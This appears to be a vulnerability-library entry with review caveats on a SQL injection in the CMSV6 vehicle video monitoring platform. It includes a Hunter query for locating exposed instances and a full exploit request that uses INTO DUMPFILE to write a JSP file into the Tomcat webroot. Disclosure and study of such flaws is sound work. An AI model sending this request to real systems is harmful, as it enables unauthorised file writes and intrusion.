---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
category_recommendation: "IOT安全/其他设备"
title: "通天星CMSV6车载视频监控平台merge存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：point_managemerge;DBFILE andsecure_file_privpermits; knownrelativeTomcatpath,writepermissions,JSPexec;possiblysession"
side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。；操作边界：所示 INTO DUMPFILE 会写 JSP，JSP 执行后自删也不等于没有文件或业务状态变化；数据库须有 FILE 权限、secure_file_priv 允许该导出路径，且数据库进程能写实际 Tomcat 路径，JSP 才可能被解析。"
source_status: "unknown"
id: "vw-dfa0a33af30052950f7d9798"
entity_id: "ve-dfa0a33af30052950f7d9798"
schema_version: "1"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"./open/webApi.html\""
---

## 核对与使用边界

- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

- 操作边界：所示 INTO DUMPFILE 会写 JSP，JSP 执行后自删也不等于没有文件或业务状态变化；数据库须有 FILE 权限、secure_file_priv 允许该导出路径，且数据库进程能写实际 Tomcat 路径，JSP 才可能被解析。
- 相对 ../../tomcat/webapps/gpsweb 依数据库当前目录与部署关系，不能泛化；多行 SQL 返回也可能使 DUMPFILE 失败。空 Host、固定长度/换行需核，缺版本、权限和响应，不能凭最终 URL 宣称成功。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：point_managemerge;DBFILE andsecure_file_privpermits; knownrelativeTomcatpath,writepermissions,JSPexec;possiblysession

- **操作与副作用边界（1）**：PoC不只是SQLi验证，INTO DUMPFILE写JSP且payload执行后自删，仍产生文件/潜在业务状态，需突出影响。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（2）**：路径../../tomcat/webapps/gpsweb依数据库cwd/同机部署，不能泛化所有安装。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：name载荷字面换行、空Host/Content-Length，需表单编码和动态长度；SQL多行返回DUMPFILE失败风险需核。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：无响应/版本/鉴权或官方补丁，只有最终访问路径。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（5）**：行业归类/Hunter元数据需修，不能把知道路径等同满足文件写权限。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 merge存在SQL注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台merge存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```plain
POST /point_manage/merge HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 

id=1&name=9' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e74282248656c6c6f20576f726c642122293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/testqwe.jsp' FROM user_session a
WHERE '9 '='9 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```


```plain
/testqwe.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lbwmh459c1s3w59c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
